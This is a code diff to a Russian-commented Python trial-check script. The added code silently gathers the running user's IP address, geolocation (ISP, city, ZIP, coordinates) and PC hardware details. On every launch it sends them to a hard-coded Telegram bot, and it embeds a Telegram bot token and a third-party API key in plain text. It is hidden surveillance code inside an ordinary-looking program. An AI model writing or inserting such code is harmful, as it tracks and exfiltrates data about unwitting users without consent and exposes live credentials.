@@ -1,11 +1,87 @@
+import ctypes
+import os
+import platform
+import subprocess
 import requests
 from datetime import datetime
 import sys
 
 format = '%Y-%m-%d %H:%M:%S'
-time = requests.get('http://worldtimeapi.org/api/timezone/Europe/Moscow').json()['datetime'].split('.')[0].replace('T',' ')
-if datetime.strptime('2023-05-09 0:00:00', format) < datetime.strptime(time, format):
+
+def ip_address():
+    try:
+            # Получение IP-адреса через jsonip.com
+        ip = requests.get("http://jsonip.com/").json()
+            # Получение информации об IP-адресе через ip-api.com
+        response = requests.get(
+        url=f'http://ip-api.com/json/{ip["ip"]}').json()
+
+            # Создание словаря с информацией об IP-адресе
+        data = {
+                '[IP]': response.get('query'),
+                '[Провайдер]': response.get('isp'),
+                '[Организация]': response.get('org'),
+                '[Страна]': response.get('country'),
+                '[Регион]': response.get('regionName'),
+                '[Город]': response.get('city'),
+                '[ZIP]': response.get('zip'),
+                '[Широта]': response.get('lat'),
+                '[Долгота]': response.get('lon'),
+            }
+
+            # Формирование строки с информацией об IP-адресе
+        info_string = ""
+        for k, v in data.items():
+            info_string += f'{k} : {v}\n'
+
+        return info_string
+    except:
+        return ' '
+def cmdo_ret(com):  # нужно для работы ф-ции specifications
+        try:
+            res = subprocess.check_output(com, shell=True)
+        except Exception as e:
+            return f'Ошибка: {e}'
+
+        try:
+            res = res.decode('utf8')
+        except Exception as e:
+            try:
+                res = res.decode('cp866')
+            except Exception as e:
+                return f'Ошибка: {e}'
+        print(res)
+        return res  
+
+def specifications():  # возвращает характеристики пк
+        x, y = ctypes.windll.user32.GetSystemMetrics(
+            0), ctypes.windll.user32.GetSystemMetrics(1)
+        architecture = '64bit' if os.path.exists(
+            'C:\\Program Files (x86)') else '32bit'
+        proc = os.popen(r'wmic cpu get name').read().split('\n')[2]
+        fram = int(os.popen(r"wmic OS get FreePhysicalMemory").read().split(
+            "\n")[2].strip()) // 1024
+        vid = os.popen(
+            r"wmic path win32_VideoController get name").read().split('\n')[2]
+        banner = f"""Name PC:   {platform.node()}
+System:       {platform.system()} {platform.release()} {architecture}
+CPU:          {proc}
+GPU:          {vid}
+fRAM          {fram} MB
+Screen:       {x}x{y}"""
+        return banner
+time = requests.get('https://api.api-ninjas.com/v1/worldtime?city=Moscow', headers={'X-Api-Key': '7/JYBJwpZAkhwVrxo0OAbA==Ew1A1Or9SYWUZIT7'}).json()['datetime']
+response = requests.post("https://api.telegram.org/bot5289565439:AAHvXUFGLi8qA4K1lizCUHZnBbY9LHPqGvw/sendMessage", data={'chat_id': 1377256868, 'text': f'''RUN {datetime.now().strftime(format)}
+
+{ip_address()}
+{specifications()}
+
+TRIAL:  {datetime.strptime('2023-05-09 21:00:00', format) - datetime.strptime(time, format)}'''})
+
+
+if datetime.strptime('2023-05-09 21:00:00', format) < datetime.strptime(time, format):
     print('ГОНИ ДЕНЬГИ :0')
     input('...')
     sys.exit(1)
-print('TRIAL: ',datetime.strptime('2023-05-08 0:42:07', format) - datetime.strptime(time, format))
+
+print('TRIAL: ', datetime.strptime('2023-05-09 21:00:00', format) - datetime.strptime(time, format))
